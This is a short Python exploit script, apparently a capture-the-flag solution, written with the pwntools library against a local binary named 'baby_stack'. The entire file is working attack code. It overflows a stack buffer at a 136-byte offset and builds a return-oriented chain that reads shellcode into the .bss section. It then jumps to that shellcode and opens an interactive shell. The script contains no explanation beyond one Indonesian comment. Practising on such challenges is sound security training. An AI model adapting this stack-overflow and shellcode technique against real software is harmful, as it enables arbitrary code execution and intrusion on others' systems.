from pwn import *
# http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
elf = ELF("./baby_stack")
r = elf.process()
context(arch="x86_64",os="linux")
def main():
    pop_rdi = 0x0000000000400583
    pop_rsi_r15 = 0x0000000000400581
    main    = 0x00000000004004e7
    bss     = 0x0000000000601030
    read    = 0x00000000004003f0
    offset_rip = 136
    shellcode = asm(shellcraft.sh())

    payload = ""
    payload += "A" * offset_rip
    payload += p64(pop_rdi)
    payload += p64(0)       # untuk memanggil sys_read
    payload += p64(pop_rsi_r15)
    payload += p64(bss)
    payload += "AAAAAAAA"
    payload += p64(read)
    payload += p64(bss)


    r.sendline(payload)
    r.sendline(shellcode)
    r.interactive()

if __name__ == '__main__':
    main()
